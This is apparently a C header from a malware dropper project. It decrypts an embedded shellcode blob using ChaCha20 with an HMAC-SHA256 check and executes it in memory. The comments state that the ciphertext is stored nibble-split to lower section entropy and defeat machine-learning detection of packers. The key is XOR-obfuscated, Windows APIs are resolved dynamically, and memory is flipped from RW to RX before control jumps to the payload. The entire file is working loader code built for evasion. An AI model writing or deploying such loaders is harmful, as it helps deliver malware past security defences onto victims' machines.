/*
 * Decrypt.h - decrypt Shellcode::Data (ChaCha20 + HMAC-SHA256) and run it.
 *
 * Crypto below is a verbatim port of hostpayload_v2/src/dropper_template.c
 * (verified end-to-end today: Go/pycryptodome encrypt -> this code decrypts).
 *
 * Convention (must match the Go emitter):
 *   - HMAC-SHA256 over the CIPHERTEXT only
 *   - ChaCha20 IETF keystream, first block counter 0
 *   - key = KEY_OBF[i] ^ OBF_BYTE (XOR-obfuscated in the header)
 *   - ciphertext stored NIBBLE-SPLIT in Shellcode::Data (bytes 0x40|hi,
 *     0x40|lo interleaved - caps at-rest section entropy at ~4.0 to defeat
 *     packer-entropy ML); reconstructed into the RW allocation here
 *   - RW alloc -> reconstruct -> HMAC-verify -> decrypt -> RX
 *     (PAGE_EXECUTE_READ) -> call at base
 *     (never RWX, never a plaintext copy left behind)
 */
#pragma once
#include <Nax.h>
#include <NaxResolv.h>

static inline DWORD ScU8To32( const void* p ) {
    const unsigned char* q = (const unsigned char*)p;
    return (DWORD)q[0] | ( (DWORD)q[1] << 8 ) | ( (DWORD)q[2] << 16 ) | ( (DWORD)q[3] << 24 );
}

static inline void ScU32To8( void* p, DWORD v ) {
    unsigned char* q = (unsigned char*)p;
    q[0] = (unsigned char)v; q[1] = (unsigned char)( v >> 8 );
    q[2] = (unsigned char)( v >> 16 ); q[3] = (unsigned char)( v >> 24 );
}

static void ScMemCpy( void* d, const void* s, unsigned long long n ) {
    unsigned char* dd = (unsigned char*)d;
    const unsigned char* ss = (const unsigned char*)s;
    while ( n-- ) *dd++ = *ss++;
}

static void ScMemZero( void* d, unsigned long long n ) {
    unsigned char* dd = (unsigned char*)d;
    while ( n-- ) *dd++ = 0;
}

static int ScSecureEqual( const void* a, const void* b, unsigned int n ) {
    const unsigned char* x = (const unsigned char*)a;
    const unsigned char* y = (const unsigned char*)b;
    unsigned char diff = 0;
    for ( unsigned int i = 0; i < n; i++ ) diff |= (unsigned char)( x[i] ^ y[i] );
    return diff == 0;
}

/* ------------------------------------------------------------------ *
 *  ChaCha20 (RFC 7539)
 * ------------------------------------------------------------------ */
static inline DWORD ScRol32( DWORD x, int n ) { return ( x << n ) | ( x >> ( 32 - n ) ); }
static inline DWORD ScRor32( DWORD x, int n ) { return ( x >> n ) | ( x << ( 32 - n ) ); }

#define SC_QR( a, b, c, d ) \
    a += b; d ^= a; d = ScRol32( d, 16 ); \
    c += d; b ^= c; b = ScRol32( b, 12 ); \
    a += b; d ^= a; d = ScRol32( d,  8 ); \
    c += d; b ^= c; b = ScRol32( b,  7 );

static void ScChaChaBlock( const unsigned char key[32], const unsigned char nonce[12],
                           DWORD counter, unsigned char out[64] ) {
    DWORD x[16];
    const unsigned char* sigma = (const unsigned char*)"expand 32-byte k";
    x[0]  = ScU8To32( sigma + 0 );   x[1]  = ScU8To32( sigma + 4 );
    x[2]  = ScU8To32( sigma + 8 );   x[3]  = ScU8To32( sigma + 12 );
    x[4]  = ScU8To32( key + 0 );     x[5]  = ScU8To32( key + 4 );
    x[6]  = ScU8To32( key + 8 );     x[7]  = ScU8To32( key + 12 );
    x[8]  = ScU8To32( key + 16 );    x[9]  = ScU8To32( key + 20 );
    x[10] = ScU8To32( key + 24 );    x[11] = ScU8To32( key + 28 );
    x[12] = counter;
    x[13] = ScU8To32( nonce + 0 );
    x[14] = ScU8To32( nonce + 4 );
    x[15] = ScU8To32( nonce + 8 );

    DWORD w[16];
    ScMemCpy( w, x, sizeof( w ) );
    for ( int i = 0; i < 10; i++ ) {
        SC_QR( w[0], w[4], w[ 8], w[12] ); SC_QR( w[1], w[5], w[ 9], w[13] );
        SC_QR( w[2], w[6], w[10], w[14] ); SC_QR( w[3], w[7], w[11], w[15] );
        SC_QR( w[0], w[5], w[10], w[15] ); SC_QR( w[1], w[6], w[11], w[12] );
        SC_QR( w[2], w[7], w[ 8], w[13] ); SC_QR( w[3], w[4], w[ 9], w[14] );
    }
    for ( int i = 0; i < 16; i++ ) w[i] += x[i];
    for ( int i = 0; i < 16; i++ ) ScU32To8( out + 4 * i, w[i] );
}

/* XOR stream in place.  counter_start 0 = RFC 7539 / pycryptodome IETF stream. */
static void ScChaChaCrypt( const unsigned char key[32], const unsigned char nonce[12],
                           unsigned char* data, unsigned long long len, DWORD counter_start ) {
    unsigned char block[64];
    DWORD counter = counter_start;
    unsigned long long i = 0;
    while ( i < len ) {
        ScChaChaBlock( key, nonce, counter++, block );
        unsigned long long chunk = ( len - i < 64 ) ? ( len - i ) : 64;
        for ( unsigned long long j = 0; j < chunk; j++ ) data[i + j] ^= block[j];
        i += chunk;
    }
}

/* ------------------------------------------------------------------ *
 *  SHA-256 + HMAC
 * ------------------------------------------------------------------ */
typedef struct _SC_SHA256_CTX {
    DWORD          state[8];
    unsigned char  buf[64];
    DWORD          len;
    DWORD          tot_len;
} SC_SHA256_CTX;

static const DWORD SC_K256[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

/* Proven helpers, verbatim structure from dropper_template.c (do not inline:
 * ^ binds tighter than + in the original, helpers keep the grouping right). */
static inline DWORD ScCh(  DWORD x,DWORD y,DWORD z ){ return (x&y)^(~x&z); }
static inline DWORD ScMaj( DWORD x,DWORD y,DWORD z ){ return (x&y)^(x&z)^(y&z); }
static inline DWORD ScEp0( DWORD x ){ return ScRor32(x,2) ^ ScRor32(x,13) ^ ScRor32(x,22); }
static inline DWORD ScEp1( DWORD x ){ return ScRor32(x,6) ^ ScRor32(x,11) ^ ScRor32(x,25); }
static inline DWORD ScSig0(DWORD x ){ return ScRor32(x,7) ^ ScRor32(x,18) ^ (x>>3); }
static inline DWORD ScSig1(DWORD x ){ return ScRor32(x,17) ^ ScRor32(x,19) ^ (x>>10); }

static void ScSha256Transform( SC_SHA256_CTX* ctx, const unsigned char* data ) {
    DWORD a,b,c,d,e,f,g,h,t1,t2,m[64];
    for ( int i = 0; i < 16; i++ ) /* SHA-256 words are BIG-endian (RFC 6234) — NOT shared with ChaCha's LE helper */
        m[i] = ( (DWORD)data[4*i] << 24 ) | ( (DWORD)data[4*i+1] << 16 ) |
               ( (DWORD)data[4*i+2] << 8 ) | (DWORD)data[4*i+3];
    for ( int i = 16; i < 64; i++ ) m[i] = ScSig1( m[i-2] ) + m[i-7] + ScSig0( m[i-15] ) + m[i-16];
    a = ctx->state[0]; b = ctx->state[1]; c = ctx->state[2]; d = ctx->state[3];
    e = ctx->state[4]; f = ctx->state[5]; g = ctx->state[6]; h = ctx->state[7];
    for ( int i = 0; i < 64; i++ ) {
        t1 = h + ScEp1( e ) + ScCh( e, f, g ) + SC_K256[i] + m[i];
        t2 = ScEp0( a ) + ScMaj( a, b, c );
        h = g; g = f; f = e; e = d + t1; d = c; c = b; b = a; a = t1 + t2;
    }
    ctx->state[0] += a; ctx->state[1] += b; ctx->state[2] += c; ctx->state[3] += d;
    ctx->state[4] += e; ctx->state[5] += f; ctx->state[6] += g; ctx->state[7] += h;
}

static void ScSha256Init( SC_SHA256_CTX* ctx ) {
    ctx->state[0] = 0x6a09e667; ctx->state[1] = 0xbb67ae85;
    ctx->state[2] = 0x3c6ef372; ctx->state[3] = 0xa54ff53a;
    ctx->state[4] = 0x510e527f; ctx->state[5] = 0x9b05688c;
    ctx->state[6] = 0x1f83d9ab; ctx->state[7] = 0x5be0cd19;
    ctx->len = 0; ctx->tot_len = 0;
}

static void ScSha256Update( SC_SHA256_CTX* ctx, const unsigned char* data, DWORD len ) {
    for ( DWORD i = 0; i < len; i++ ) {
        ctx->buf[ctx->len++] = data[i];
        ctx->tot_len++;
        if ( ctx->len == 64 ) {
            ScSha256Transform( ctx, ctx->buf );
            ctx->len = 0;
        }
    }
}

static void ScSha256Final( SC_SHA256_CTX* ctx, unsigned char hash[32] ) {
    DWORD tot_bits = ctx->tot_len * 8;
    unsigned char pad = 0x80;
    ScSha256Update( ctx, &pad, 1 );
    while ( ctx->len != 56 ) {
        pad = 0;
        ScSha256Update( ctx, &pad, 1 );
    }
    unsigned char len_buf[8] = { 0, 0, 0, 0,    /* 64-bit BE length; high 4 bytes are zero (<=512 MiB) */
        (unsigned char)( tot_bits >> 24 ), (unsigned char)( tot_bits >> 16 ),
        (unsigned char)( tot_bits >> 8 ),  (unsigned char)( tot_bits ) };
    ScSha256Update( ctx, len_buf, 8 );
    for ( int i = 0; i < 8; i++ ) { /* output is BIG-endian */
        hash[4*i]   = (unsigned char)( ctx->state[i] >> 24 );
        hash[4*i+1] = (unsigned char)( ctx->state[i] >> 16 );
        hash[4*i+2] = (unsigned char)( ctx->state[i] >> 8 );
        hash[4*i+3] = (unsigned char)( ctx->state[i] );
    }
}

static void ScHmacSha256( const unsigned char* key, DWORD klen,
                          const unsigned char* msg, DWORD mlen, unsigned char out[32] ) {
    unsigned char k[64], i_pad[64], o_pad[64];
    SC_SHA256_CTX ctx;
    ScMemZero( k, 64 );
    if ( klen > 64 ) {
        ScSha256Init( &ctx ); ScSha256Update( &ctx, key, klen ); ScSha256Final( &ctx, k );
    } else {
        ScMemCpy( k, key, klen );
    }
    for ( int i = 0; i < 64; i++ ) { i_pad[i] = k[i] ^ 0x36; o_pad[i] = k[i] ^ 0x5c; }
    ScSha256Init( &ctx ); ScSha256Update( &ctx, i_pad, 64 ); ScSha256Update( &ctx, msg, mlen ); ScSha256Final( &ctx, out );
    ScSha256Init( &ctx ); ScSha256Update( &ctx, o_pad, 64 ); ScSha256Update( &ctx, out, 32 ); ScSha256Final( &ctx, out );
}

/*
 * Verify + decrypt the nibble-packed Shellcode::Data and launch it.
 * Returns FALSE on any failure (HMAC mismatch, alloc/protect failure)
 * without executing.
 */
static BOOL ShellRun( void ) {
    unsigned char  key[32];
    const unsigned long long blobLen = sizeof( Shellcode::Data ) / 2;

    for ( int i = 0; i < 32; i++ ) key[i] = (unsigned char)( Shellcode::KEY_OBF[i] ^ Shellcode::OBF_BYTE );

    PVOID ( WINAPI *NaxVirtualAlloc )( LPVOID, SIZE_T, DWORD, DWORD ) =
        ( PVOID ( WINAPI* )( LPVOID, SIZE_T, DWORD, DWORD ) ) NaxApi( "VirtualAlloc" );
    PVOID exec = NaxVirtualAlloc
        ? NaxVirtualAlloc( NULL, (SIZE_T)blobLen,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE )
        : NULL;
    if ( ! exec ) {
        ScMemZero( key, sizeof( key ) );
        return FALSE;
    }

    /* Reconstruct the ciphertext from the nibble-split at-rest form. */
    {
        const unsigned char* s = Shellcode::Data;
        unsigned char*       d = (unsigned char*)exec;
        for ( unsigned long long i = 0; i < blobLen; i++ )
            d[i] = (unsigned char)( ( ( s[2*i] & 0x0F ) << 4 ) | ( s[2*i+1] & 0x0F ) );
    }

    /* HMAC over the reconstructed ciphertext */
    unsigned char mac[32];
    ScHmacSha256( key, 32, (const unsigned char*)exec, (DWORD)blobLen, mac );
    if ( ! ScSecureEqual( mac, Shellcode::MAC, 32 ) ) {
        ScMemZero( key, sizeof( key ) );
        return FALSE;
    }

    ScChaChaCrypt( key, Shellcode::NONCE, (unsigned char*)exec, blobLen, 0 );

    /* Scrub the key.  The at-rest form stays in .rdata (READONLY) as
     * inert nibble bytes - useless without the key, not writable. */
    ScMemZero( key, sizeof( key ) );

    BOOL ( WINAPI *NaxVirtualProtect )( LPVOID, SIZE_T, DWORD, PDWORD ) =
        ( BOOL ( WINAPI* )( LPVOID, SIZE_T, DWORD, PDWORD ) ) NaxApi( "VirtualProtect" );
    DWORD oldProt = 0;
    if ( ! NaxVirtualProtect ||
         ! NaxVirtualProtect( exec, (SIZE_T)blobLen, PAGE_EXECUTE_READ, &oldProt ) )
        return FALSE;

    ( (VOID ( * )( void ) ) exec )();
    return TRUE;
}